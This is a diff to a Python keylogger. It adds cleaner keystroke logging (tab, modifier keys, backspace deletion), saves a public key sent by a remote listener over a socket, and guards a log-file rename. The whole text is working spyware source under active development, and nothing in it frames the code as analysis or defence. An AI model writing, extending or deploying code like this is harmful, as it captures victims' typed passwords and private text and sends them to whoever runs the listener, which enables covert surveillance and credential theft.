@@ -16,6 +16,7 @@ from datetime import datetime
 
 # Master TODO
 # 1. Implement keyboard interrupt handling
+# 2. Clean up output in log files ( backspaces, tabs, etc )
 
 # Classes for good python developer standards :)!
 class Keylogger:
@@ -39,6 +40,22 @@ class Keylogger:
                 name = "\n"
             elif name == "decimal":
                 name = "."
+            elif name == "tab":
+                name = "\t"
+            elif name == "ctrl":
+                name = " [CTRL] "
+            elif name == "alt":
+                name = " [ALT] "
+            elif name == "windows":
+                name = " [SUPER] "
+            elif name == "command":
+                name = " [COMMAND] "
+            elif name == "backspace":
+                try:
+                    self.log = self.log[:len(self.log)-1]
+                    return
+                except:
+                    pass
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
@@ -61,9 +78,9 @@ class Keylogger:
             print("Could not connect to socket, exiting...")
             sys.exit(1)
 
-        # TODO listener will reply with the public key, need to make logic to save it
         self.socket.send("REQ_PUB".encode())
 
+        # Save the public key the server sends
         buf = b""
         while True:
             data = self.socket.recv(4096)
@@ -174,7 +191,10 @@ class Keylogger:
     # Start the keylogger
     def start(self):
         if self.args.listen:
-            os.rename(self.args.outfile, f"{self.args.outfile}-{datetime.now()}.bak".replace(" ", ""))
+            try:
+                os.rename(self.args.outfile, f"{self.args.outfile}-{datetime.now()}.bak".replace(" ", ""))
+            except FileNotFoundError:
+                pass
             self.listen()
         else:
             # Initialize keylogger
